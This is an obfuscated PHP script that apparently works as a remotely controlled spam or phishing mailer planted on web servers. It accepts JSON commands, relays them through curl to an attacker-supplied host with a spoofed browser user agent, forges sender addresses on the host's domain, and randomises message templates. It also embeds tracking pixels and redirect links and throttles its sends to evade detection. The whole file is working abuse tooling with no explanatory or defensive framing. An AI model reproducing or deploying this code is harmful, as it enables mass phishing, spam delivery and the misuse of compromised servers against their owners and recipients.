<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spbb6ad2) { if ($spbb6ad2 == 'keys') { return array_keys($this->_keys); } } public function Import($spbb6ad2, $sp53d13a) { if (is_array($sp53d13a)) { $this->values[$spbb6ad2] = array(); foreach ($sp53d13a as $spf3d57b) { if (!empty($spf3d57b['key'])) { $this->values[$spbb6ad2][$spf3d57b['key']] = $spf3d57b['value']; } else { $this->values[$spbb6ad2][] = $spf3d57b['value']; } } } else { $this->Assign($spbb6ad2, $sp53d13a); } } public function Assign($spbb6ad2, $sp619108) { $this->values[$spbb6ad2] = $sp619108; } public function Parse($sp05cbec) { $sp33fa34 = ''; $sp7d19e7 = 0; while (true) { $sp6f3892 = strpos($sp05cbec, '{', $sp7d19e7); if ($sp6f3892 === false) { $sp33fa34 .= substr($sp05cbec, $sp7d19e7); break; } $sp33fa34 .= substr($sp05cbec, $sp7d19e7, $sp6f3892 - $sp7d19e7); $sp7d19e7 = $sp6f3892 + 1; $spceff95 = ''; $spe196ef = '{'; $spe56de2 = array(); $sp92036c = false; $sp953ab5 = false; $sp9ffe3a = 'var'; while ($sp7d19e7 < strlen($sp05cbec)) { $sp51dc51 = substr($sp05cbec, $sp7d19e7, 1); $spe196ef .= $sp51dc51; if ($sp51dc51 == ',' || $sp51dc51 == '>' || $sp51dc51 == '|') { if ($sp9ffe3a == 'alias') { $sp92036c = $spceff95; } elseif ($sp9ffe3a == 'mod') { $sp953ab5 = $spceff95; } else { $spe56de2[] = $spceff95; } $spceff95 = ''; if ($sp51dc51 == '>') { $sp9ffe3a = 'alias'; } if ($sp51dc51 == '|') { $sp9ffe3a = 'mod'; } $sp7d19e7++; continue; } if ($sp51dc51 == '}') { if ($sp9ffe3a == 'alias') { $sp92036c = $spceff95; } elseif ($sp9ffe3a == 'mod') { $sp953ab5 = $spceff95; } else { $spe56de2[] = $spceff95; } $sp7d19e7++; break; } $spceff95 .= $sp51dc51; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp51dc51) == 0) { $sp7d19e7++; $spe56de2 = array(); break; } $sp7d19e7++; } if (sizeof($spe56de2) == 0) { $sp33fa34 .= $spe196ef; continue; } $sp65039e = false; $sp05c5e9 = false; if (preg_match('/^\\^/', $spe56de2[0]) > 0) { $spe56de2[0] = substr($spe56de2[0], 1); $sp65039e = true; } if (preg_match('/^\\!/', $spe56de2[0]) > 0) { $spe56de2[0] = substr($spe56de2[0], 1); $sp05c5e9 = true; } $spf666ca = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spe56de2[0], $speb3a67) > 0) { $spf666ca = $speb3a67[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spe56de2[0], $speb3a67) > 0) { $spf666ca = explode('-', $speb3a67[1]); } if ($spf666ca !== false) { $spe56de2[0] = substr($spe56de2[0], 0, strpos($spe56de2[0], '[')); } $this->_keys[$spe56de2[0]] = true; if (empty($this->values[$spe56de2[0]]) && empty($this->fixed[$spe56de2[0]])) { continue; } if ($sp65039e) { unset($this->fixed[$spe56de2[0]]); } if (isset($this->fixed[$spe56de2[0]])) { $spab01ee = $this->fixed[$spe56de2[0]]; } else { $spab01ee = ''; $sp3551a2 = 1; if (sizeof($spe56de2) == 2) { $sp3551a2 = $spe56de2[1]; } if (sizeof($spe56de2) == 3) { $sp3551a2 = rand($spe56de2[1], $spe56de2[2]); } for ($specb19e = 0; $specb19e < $sp3551a2; $specb19e++) { if (is_array($this->values[$spe56de2[0]])) { if (!is_array($this->used[$spe56de2[0]])) { $this->used[$spe56de2[0]] = array(); } if (count($this->used[$spe56de2[0]]) == count($this->values[$spe56de2[0]])) { $this->used[$spe56de2[0]] = array(); } if ($spf666ca !== false && is_scalar($spf666ca)) { $spab01ee .= $this->values[$spe56de2[0]][$spf666ca]; $this->used[$spf666ca] = true; } else { $spb430b3 = array(); if (is_array($spf666ca)) { $sp0bfb34 = $spf666ca[0]; $spb1c058 = $spf666ca[1]; } else { $sp0bfb34 = 0; $spb1c058 = count($this->values[$spe56de2[0]]) - 1; } for ($sp0b172d = $sp0bfb34; $sp0b172d <= $spb1c058; $sp0b172d++) { if ($sp05c5e9 && !empty($this->used[$spe56de2[0]][$sp0b172d])) { continue; } $spb430b3[] = $sp0b172d; } $sp302be2 = $spb430b3[rand(0, count($spb430b3) - 1)]; $this->used[$spe56de2[0]][$sp302be2] = true; $spab01ee .= $this->values[$spe56de2[0]][$sp302be2]; } } else { $spab01ee .= $this->values[$spe56de2[0]]; } } } $spab01ee = $this->Parse($spab01ee); if ($sp953ab5 !== false) { for ($sp257027 = 0; $sp257027 < strlen($sp953ab5); $sp257027++) { switch (substr($sp953ab5, $sp257027, 1)) { case 'b': $spab01ee = base64_encode($spab01ee); break; case 'q': $spab01ee = quoted_printable_encode($spab01ee); break; default: break; } } } if ($sp65039e) { $this->fixed[$spe56de2[0]] = $spab01ee; } if ($sp92036c !== false && $sp92036c != '') { $this->fixed[$sp92036c] = $spab01ee; } $sp33fa34 .= $spab01ee; } return $sp33fa34; } } $sp2e0f8d = file_get_contents('php://input'); $sp36aa34 = json_decode($sp2e0f8d, true); if (empty($sp36aa34['via_proxy'])) { $sp36aa34['via_proxy'] = true; $sp8c75c1 = curl_init($sp36aa34['prefix'] . $sp36aa34['files']['s']); $sp02fc53 = json_encode($sp36aa34); curl_setopt($sp8c75c1, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp8c75c1, CURLOPT_TIMEOUT, 600); curl_setopt($sp8c75c1, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp8c75c1, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp8c75c1, CURLOPT_REFERER, $spc6011a); curl_setopt($sp8c75c1, CURLOPT_POST, true); curl_setopt($sp8c75c1, CURLOPT_POSTFIELDS, $sp02fc53); curl_setopt($sp8c75c1, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp02fc53))); $sp87e198 = curl_exec($sp8c75c1); echo $sp87e198; die; } $sp8b350f = $_SERVER['SERVER_ADDR']; $sp801554 = $_SERVER['HTTP_HOST']; $sp801554 = preg_replace('/^www\\./', '', $sp801554); $spcb2713 = new Macros(); $spcb2713->Assign('server_addr', $sp8b350f); $spcb2713->Assign('server_host', $sp801554); foreach ($sp36aa34['macros'] as $spbb6ad2 => $sp53d13a) { $spcb2713->Import($spbb6ad2, $sp53d13a); } $sp0436d5 = preg_replace('/^www\\./i', '', $sp801554); $spfaf26c = $spcb2713->Parse('{from_user}@' . $sp0436d5); $spcb2713->Assign('from_email', $spfaf26c); $spcb2713->Assign('prefix', $sp36aa34['prefix']); $spcb2713->Assign('html', $sp36aa34['letter']['html']); $sp7d19e7 = 0; $sp07a9a7 = 0; $sp38dc11 = 0; $sp38f0a9 = array(); foreach ($sp36aa34['rcpt'] as $spa9ec76) { $spcb2713->Assign('email', $spa9ec76['email']); $spcb2713->Assign('entry', $spa9ec76); $spcb2713->Assign('date', date('r')); $spcb2713->Assign('redirect', $sp36aa34['prefix'] . $sp36aa34['files']['r']); $spcb2713->Assign('redirect_with_uri', $sp36aa34['prefix'] . $sp36aa34['files']['r'] . '?uri='); $spcb2713->Assign('unsubscribe', $sp36aa34['prefix'] . $sp36aa34['files']['u'] . '?id=' . $spa9ec76['id']); $spcb2713->Assign('delivery', '<img src="' . $sp36aa34['prefix'] . $sp36aa34['files']['d'] . '?id=' . $spa9ec76['id'] . '" />'); $spa6fd2d = $spcb2713->Parse($sp36aa34['envelope']['header']); $spfe0091 = $spcb2713->Parse($sp36aa34['envelope']['body']); if (!empty($spa9ec76['name'])) { $spacb659 = $spa9ec76['name'] . ' <' . $spa9ec76['email'] . '>'; } else { $spacb659 = $spa9ec76['email']; } $sp9674f6 = $spcb2713->Parse($sp36aa34['letter']['subject']); if ($sp7d19e7 > 0) { sleep(rand(3, 8)); } $sp8920d1 = mail($spacb659, $sp9674f6, $spfe0091, $spa6fd2d); $sp38f0a9[$spa9ec76['id']] = $sp8920d1; if ($sp8920d1) { $sp07a9a7++; } else { $sp38dc11++; } $sp7d19e7++; } echo serialize(array('total' => count($sp36aa34['rcpt']), 'sent' => $sp7d19e7, 'success' => $sp07a9a7, 'error' => $sp38dc11, 'rcpt' => $sp38f0a9));